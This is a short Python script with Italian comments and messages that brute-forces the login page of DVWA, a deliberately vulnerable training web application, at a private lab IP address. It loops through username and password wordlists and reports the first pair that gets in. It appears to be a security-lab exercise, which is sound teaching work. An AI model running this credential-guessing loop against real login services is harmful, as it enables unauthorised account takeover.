import requests

def main():
    usernames_file = "usernames.txt"
    passwords_file = "passwords.txt"
    login_url = 'http://192.168.1.101/dvwa/login.php'
    brute_url = 'http://192.168.1.101/dvwa/vulnerabilities/brute/'

    primo_login = {'username': 'admin', 'password': 'password', 'Login': 'Login'}

    with requests.Session() as session:
        session.post(login_url, data=primo_login)

        try:
            with open(usernames_file) as file_utenti:
                lista_utenti = file_utenti.readlines()
            with open(passwords_file) as file_passwords:
                lista_password = file_passwords.readlines()
                
                for username in lista_utenti:
                    username = username.strip()

                    for password in lista_password:
                        password = password.strip()

                        login_data = {'username': username, 'password': password, 'Login': 'Login'}
                        try:
                            risposta = session.get(brute_url, params=login_data)
                            print(f"\nProvo con: {username} e {password}")

                            if risposta.status_code == 200:
                                if 'Username and/or password incorrect' in risposta.text:
                                    print(f"Login Fallito con: {username} e {password}\n")
                                else:
                                    print(f"Accesso trovato con: {username} e {password}\n")
                                    return
                            else:
                                print("Errore", risposta.status_code)
                        except requests.exceptions.RequestException as e:
                            print("Errore nella richiesta: ", e)
        except FileNotFoundError:
            print("Controlla il percorso dei file")

if __name__ == "__main__":
    main()
